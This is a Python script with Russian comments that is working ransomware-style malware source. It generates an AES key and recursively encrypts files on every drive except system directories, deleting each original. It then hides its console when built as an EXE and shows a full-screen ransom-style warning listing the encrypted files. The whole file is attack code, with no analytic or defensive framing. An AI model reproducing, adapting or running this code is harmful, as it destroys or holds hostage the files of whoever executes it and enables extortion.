import os
import sys
import platform
import base64
import tkinter as tk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# ===== КОНФИГ =====
ENCRYPTED_LOG = "encrypted_files.log"
KEY_FILE = "key.txt"
SKIP_DIRS = ["Windows", "WinSxS", "System32", "Program Files", "ProgramData", 
             "boot", "efi", "lib", "bin", "usr", "dev", "proc", "snap"]

# ===== ШИФРОВАНИЕ =====
def generate_key():
    return os.urandom(32)

def encrypt_file(key, file_path):
    try:
        # Пропускаем системные файлы
        if any(sd in file_path for sd in SKIP_DIRS):
            return False
            
        # Пропускаем уже зашифрованные и наши файлы
        if file_path.endswith('.encrypted') or file_path in [ENCRYPTED_LOG, KEY_FILE]:
            return False
            
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Шифрование
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Сохранение
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(iv + encrypted_data)
        os.remove(file_path)
        return True
        
    except Exception:
        return False

def encrypt_system():
    # Генерация ключа
    key = generate_key()
    with open(KEY_FILE, "w") as f:
        f.write(base64.b64encode(key).decode('utf-8'))
    
    # Очистка лога
    with open(ENCRYPTED_LOG, 'w', encoding='utf-8') as log:
        log.write("ЗАШИФРОВАННЫЕ ФАЙЛЫ:\n\n")
    
    # Поиск дисков
    drives = []
    if platform.system() == 'Windows':
        drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    else:
        drives = ["/"]
    
    # Шифрование
    encrypted_count = 0
    for drive in drives:
        for root, _, files in os.walk(drive):
            for file in files:
                file_path = os.path.join(root, file)
                if encrypt_file(key, file_path):
                    encrypted_count += 1
                    with open(ENCRYPTED_LOG, 'a', encoding='utf-8') as log:
                        log.write(f"{file_path}\n")
    
    return encrypted_count

# ===== GUI (ТОЛЬКО ГОРИЗОНТАЛЬНЫЙ СКРОЛЛ) =====
def show_gui(encrypted_count):
    window = tk.Tk()
    window.title("!!! ВАЖНО !!!")
    window.attributes('-fullscreen', True)
    window.configure(bg='#8B0000')  # Тёмно-красный
    
    # Заголовок
    title = tk.Label(
        window, 
        text="ВНИМАНИЕ! ВАША СИСТЕМА ЗАШИФРОВАНА",
        font=("Arial", 28, "bold"),
        fg="#FFD700",  # Золотой
        bg="#8B0000",
        pady=20
    )
    title.pack(fill=tk.X)
    
    # Статус
    status = tk.Label(
        window,
        text=f"Зашифровано файлов: {encrypted_count}",
        font=("Arial", 20),
        fg="white",
        bg="#8B0000"
    )
    status.pack(pady=10)
    
    # Фрейм для текста
    text_frame = tk.Frame(window, bg='#4B0000')
    text_frame.pack(fill=tk.BOTH, expand=True, padx=30, pady=20)
    
    # ГОРИЗОНТАЛЬНЫЙ СКРОЛЛБАР
    h_scrollbar = tk.Scrollbar(
        text_frame,
        orient=tk.VERTICAL,
        width=16,
        troughcolor='#600000',
        bg='#C00000',
        activebackground='#FF0000'
    )
    h_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
    
    # Текстовая область (БЕЗ ПЕРЕНОСА СЛОВ)
    text_area = tk.Text(
        text_frame, 
        wrap=tk.NONE,  # Отключаем перенос слов
        xscrollcommand=h_scrollbar.set,  # Горизонтальная прокрутка
        bg='#300000', 
        fg='white', 
        font=("Consolas", 12),
        padx=20, 
        pady=20
    )
    text_area.pack(fill=tk.BOTH, expand=True)
    
    # Связь скроллбара с текстовой областью
    h_scrollbar.config(command=text_area.xview)
    
    # Загрузка лога
    try:
        with open(ENCRYPTED_LOG, "r", encoding="utf-8") as f:
            text_area.insert(tk.END, f.read())
    except:
        text_area.insert(tk.END, "Ошибка загрузки списка файлов")
    text_area.config(state=tk.DISABLED)
    
    # Инструкция
    instruction = tk.Label(
        window,
        text="Все ваши файлы зашифрованы. Для расшифровки обратитесь к администратору.",
        font=("Arial", 16),
        fg="#FF6347",  # Томатный
        bg="#8B0000",
        pady=15
    )
    instruction.pack(fill=tk.X)
    
    # Кнопка выхода
    exit_btn = tk.Button(
        window,
        text="ЗАКРЫТЬ (ESC)",
        command=window.destroy,
        font=("Arial", 14, "bold"),
        bg="#B22222",
        fg="white",
        height=2,
        width=20
    )
    exit_btn.pack(pady=20)
    window.bind("<Escape>", lambda e: window.destroy())
    
    window.mainloop()

# ===== ЗАПУСК =====
if __name__ == "__main__":
    # Скрытие консоли в EXE
    if getattr(sys, 'frozen', False):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Шифруем систему
    count = encrypt_system()
    
    # Запускаем GUI
    show_gui(count)